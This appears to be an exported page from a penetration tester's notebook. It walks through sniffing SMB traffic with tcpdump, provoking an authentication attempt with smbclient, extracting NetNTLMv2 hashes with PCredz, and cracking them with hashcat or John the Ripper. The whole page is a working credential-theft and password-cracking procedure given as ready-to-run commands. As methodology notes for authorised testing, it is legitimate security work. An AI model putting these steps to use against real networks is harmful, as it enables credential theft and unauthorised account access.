<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>extract NetNTLMv2 hashes from pcap file and crack</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>extract NetNTLMv2 hashes from pcap file and crack</h1><br/><strong><h3>Prerequisite: Install PCredz</h3></strong><strong><br /></strong><div class="codebox"><pre>apt <span style="color:#ff9d00;font-weight:700">install</span> python3-pip <span style="color:#ff9d00;font-weight:700">&amp;&amp;</span> pip3 <span style="color:#ff9d00;font-weight:700">install</span> Cython <span style="color:#ff9d00;font-weight:700">&amp;&amp;</span> pip3 <span style="color:#ff9d00;font-weight:700">install</span> python-libpcap   <span style="color:#0088ff;font-weight:400">#Linux</span><br /><span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span><br />git clone https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>lgandx<span style="color:#ff9d00;font-weight:700">/</span>PCredz.git</pre></div><br /><br /><strong><h3>How to do it(without using Metasploit):</h3></strong><br />1. <strong>Sniff</strong> → We can use both tcpdump or Wireshark to sniff and save the packet capture<br />    <div class="codebox"><pre>tcpdump -nv -s0 port 445 -w <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>captured.pcap</pre></div><br />    -s0 → indicates that we want full packets, not just the first 68 bytes (some old versions of tcpdump will only grab the first 68 bytes)<br />    -v → print out how many packets it has received so far<br />    -w → save file <br />2. <strong>Authentication attempt</strong> → Here we simulate a client that try to authenticate with us<br />    <div class="codebox"><pre>smbclient <span style="color:#ff9d00;font-weight:700">//</span>AttackerIP<span style="color:#ff9d00;font-weight:700">/</span>c$ random -U random</pre></div><br />    <a href=""><img src="images/814-1.png" alt="images/814-1.png" /></a><br />3. <strong>Terminate tcpdump</strong> → tcpdump sniffer in the other tab should show that you’ve captured some packets.<br />    YOU MUST press CTRL-C in the tcpdump terminal or tcpdump will not write the packets into its capture file. We’ve gathered our packets<br />5. <strong>Extract</strong> → Extract hashes into a crackable format with  PCredz(https://github.com/lgandx/PCredz) that is a free tool to extract many types of hashes<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>PCredz<br />python3 Pcredz -f <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>captured.pcap</pre></div> <a href=""><img src="images/814-2.png" alt="images/814-2.png" /></a><br />    2.1. The Pcredz tool doesn&#39;t have an option to save the hashes directly in a crackable format, It instead create a log file named CredentialDump-Session.log in the PCredz folder that contains the output, including hashes. Now we manually select the hash and save it in a.txt file, a format we can use with Hashcat or John <br />    <div class="codebox"><pre>nano hash.txt<br /><span style="color:#ff9d00;font-weight:700">cat</span> hash.txt</pre></div><br />    <a href=""><img src="images/814-3.png" alt="images/814-3.png" /></a><br /><br />8. <strong>Crack</strong> <br />   ◇ We can crack with <a href="Home--Penetration_Test_Methodology--Network_Pentest--Cracking--Jhon_the_Ripper_(CPU).html">John the Ripper</a> or <a href="Home--Penetration_Test_Methodology--Network_Pentest--Cracking--Hashcat_(CPU-GPU).html">Hashcat</a><br />         ▪ <div class="codebox"><pre>hashcat -w 3 -a 0 -m 5600 hash.txt password.lst   <span style="color:#0088ff;font-weight:400">#Hash-mode 5600 is for NetNTLMv2</span></pre></div><br />         ▪ <div class="codebox"><pre>john hash.txt                                     <span style="color:#0088ff;font-weight:400">#JtR autodetect the type of the hash</span></pre></div><br />   ◇ Cain can sniff, extract, and crack all by itself, but it isn&#39;t a strong cracker<br /><br /><br /><br /></div>
</body>
</html>
